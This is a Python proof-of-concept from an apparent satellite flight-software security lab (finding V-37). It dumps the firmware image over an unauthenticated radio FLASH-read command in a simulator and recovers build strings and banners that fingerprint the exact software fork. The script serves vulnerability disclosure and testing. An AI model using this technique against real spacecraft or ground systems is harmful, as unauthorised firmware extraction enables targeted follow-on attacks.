#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-37  Build metadata leaks the exact software base: unauthenticated
# FLASH dump (0x07) returns the application image with embedded strings,
# and the periodic banners identify the fork ('HackTheWorld!', 'Pwnsat').
# SPARTA: RT-0001.02 (software inventory from artifacts)
def main(dev, ev):
    tms = dev.tc(0x03, b"", via="radio")
    v = dev.find(tms, 0x03)[0].payload[1:4]
    ev.log(f"version TM: {v[2]}.{v[1]}.{v[0]} (SEND_FW)")
    frames = dev.tc(0x07, b"", via="radio")          # FLASH dump
    image = bytearray()
    for t in frames:
        if t.payload[0] == 1:
            image += t.payload[7:23]
    ev.log(f"image bytes dumped: {len(image)}")
    hits = [s for s in (b"2020 Follo", b"Whte Rabit", b"GPST",
                        b"NMEA") if s in image]
    ev.log(f"embedded build strings recovered: {hits}")
    check(b"2020 Follo" in image and b"Whte Rabit" in image,
          "image strings leaked from flash dump (note the 'Rabit' typo -- "
          "a build fingerprint that pins this exact fork)")
    check(len(image) >= 240, "full image dumped unauthenticated")
    frames = dev.advance(31000)
    idle = [t.payload.rstrip(b"\x00") for t in dev.find(frames, 0x3FF)]
    sync = [t.payload[1:7] for t in dev.find(frames, 0x01)
            if t.payload[1:7] == b"Pwnsat"]
    ev.log(f"periodic artifacts: idle TM {idle[:1]}, sync tag {sync[:1]}")
    ev.log("=> attacker maps the image to its open-source base and the "
           "lab fork, then pulls the matching bug catalogue (this report)")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-37 build metadata -> software base", main))
